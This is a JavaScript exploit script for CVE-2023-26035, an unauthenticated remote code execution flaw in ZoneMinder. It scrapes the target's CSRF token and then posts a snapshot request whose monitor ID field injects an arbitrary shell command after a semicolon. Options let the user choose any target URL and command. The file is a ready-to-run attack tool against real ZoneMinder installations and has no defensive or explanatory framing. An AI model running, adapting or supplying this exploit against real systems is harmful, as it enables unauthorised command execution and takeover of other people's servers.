// CVE-2023-26035 - Zoneminder Unauthenticated RCE
// Author: @Yuma-Tsushima07
// Date: 24/12/2023
const axios = require('axios');
const cheerio = require('cheerio');
const yargs = require('yargs');
const { hideBin } = require('yargs/helpers');

class ZoneMinderExploit {
    constructor(targetUri, cmd) {
        this.targetUri = targetUri.replace(/\/+$/, '') + '/';
        this.cmd = cmd;
        this.csrfMagic = null;
    }

    async printCsrfMagic() {
        try {
            console.log('Fetching CSRF Token');
            const response = await axios.get(this.targetUri + 'index.php');

            if (response.status === 200) {
                this.csrfMagic = this.getCsrfMagic(response.data);
                if (!this.csrfMagic || !this.csrfMagic.startsWith('key:')) {
                    console.error('Unable to parse token.');
                    return false;
                }
                console.log(`Got Token: ${this.csrfMagic}`);
                return true;
            } else {
                console.error(`Unable to fetch token. Status Code: ${response.status}`);
                return false;
            }
        } catch (error) {
            console.error('Error occurred while fetching CSRF token:', error.message);
            return false;
        }
    }

    async executeCommand() {
        if (!(await this.printCsrfMagic())) {
            return;
        }

        console.log('[>] Sending payload..');
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded', // Adjust content type if needed
        };

        const data = new URLSearchParams();
        data.append('view', 'snapshot');
        data.append('action', 'create');
        data.append('monitor_ids[0][Id]', `;${this.cmd}`);
        data.append('__csrf_magic', this.csrfMagic);

        try {
            const response = await axios.post(`${this.targetUri}/index.php`, data, {
                headers,
                timeout: 5000,
            });
            if (response.status === 200) {
                console.log('[>] Command executed successfully!!');
            } else {
                console.error('[!] Failed to send payload. Status Code:', response.status);
                console.error('Response Text:', response.data);
            }
        } catch (error) {
            if (error.code === 'ECONNABORTED') {
                console.error('[!] Script executed beyond the time limit. Exiting');
            } else {
                console.error('Error occurred while executing command:', error.message);
            }
        }
    }

    getCsrfMagic(htmlContent) {
        const $ = cheerio.load(htmlContent);
        const csrfMagic = $('input[name="__csrf_magic"]').val();
        return csrfMagic || null;
    }
}

const argv = yargs(hideBin(process.argv))
    .option('target', {
        alias: 't',
        describe: 'Target URI (e.g., http://example.com/zm/)',
        demandOption: true,
        type: 'string',
    })
    .option('cmd', {
        alias: 'c',
        describe: 'Command to execute on the target',
        demandOption: true,
        type: 'string',
    })
    .help()
    .alias('help', 'h')
    .argv;

const exploit = new ZoneMinderExploit(argv.target, argv.cmd);
exploit.executeCommand();
